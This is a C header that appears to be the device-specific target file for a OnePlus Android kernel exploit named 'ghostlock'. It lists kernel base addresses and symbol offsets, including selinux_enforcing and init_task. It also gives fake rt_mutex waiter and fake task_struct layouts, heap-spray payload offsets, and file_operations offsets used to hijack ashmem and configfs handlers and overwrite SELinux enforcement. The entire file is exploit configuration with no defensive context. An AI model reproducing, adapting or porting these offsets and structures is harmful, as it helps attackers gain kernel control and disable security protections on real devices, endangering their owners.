#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "ghostlock_oneplus"
#define BUILD_FINGERPRINT "oneplus"

/* Kernel address space (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
/* physmap on this SoC spans ~48GB (DDR ranks at high phys addrs) */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL

/* Global symbol offsets (kallsyms) — only what the SELinux write touches. */
#define INIT_TASK_OFF              0x0240cf00ULL
#define ROOT_TASK_GROUP_OFF        0x0263d580ULL
#define SELINUX_ENFORCING_OFF      0x026894d0ULL
#define CONFIGFS_READ_ITER_OFF     0x005154acULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005156e0ULL
#define ASHMEM_IOCTL_OFF           0x00d85964ULL
#define ASHMEM_COMPAT_IOCTL_OFF    0x00d85834ULL
#define ASHMEM_MMAP_OFF            0x00d858b0ULL
#define ASHMEM_OPEN_OFF            0x00d854b4ULL
#define ASHMEM_RELEASE_OFF         0x00d85a04ULL
#define ASHMEM_SHOW_FDINFO_OFF     0x00d8580cULL
#define COPY_SPLICE_READ_OFF       0x00491578ULL

/* Derived macros */
#define INIT_TASK            (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP      (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING    (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define ASHMEM_IOCTL         (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL  (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP          (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN          (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE       (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO   (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define COPY_SPLICE_READ     (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)

#define PSELECT_WAITER_WORD_SHIFT 0

/* Fake waiter / fake task struct field offsets (BTF verified). */
#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x94
#define FAKE_TASK_NORMAL_PRIO_OFF    0x9c
#define FAKE_TASK_TASK_GROUP_OFF     0x420
#define FAKE_TASK_PI_LOCK_OFF        0x9ec
#define FAKE_TASK_PI_WAITERS_OFF     0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF    0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0xa18

/* Payload layout within the sprayed page. */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280

/* file_operations table field offsets. */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF       0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

#ifndef TARGET_CONFIG_H
#error "TARGET_CONFIG_H is not defined; build with -DTARGET_CONFIG_H=..."
#endif

#include TARGET_CONFIG_H

#endif
